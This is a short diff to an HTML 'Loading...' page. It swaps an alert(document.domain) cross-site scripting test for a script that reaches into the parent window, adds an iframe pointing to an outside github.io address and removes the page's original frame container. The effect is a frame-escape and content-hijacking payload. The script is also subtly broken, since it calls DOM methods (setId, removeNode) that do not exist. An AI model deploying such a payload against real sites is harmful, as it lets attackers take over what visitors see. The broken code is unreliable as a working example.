@@ -10,7 +10,20 @@
 <body>
     <div>Loading...</div>
 
-    <script>alert(document.domain)</script>
+<script>
+let parent = window.parent;
+if (parent.document.getElementById("iframe_container") != null) {
+    let replacement = parent.document.createElement("iframe");
+    replacement.setAttribute("src", "https://www.Jessasyn.github.io/Index");
+    replacement.setId("escaped_container");
+    parent.document.body.append(replacement);
+
+    let original = parent.document.getElementById("iframe_container");
+    original.parentNode.removeNode(original);
+} else {
+    alert(document.domain);
+}
+</script>
 </body>
 
 </html>
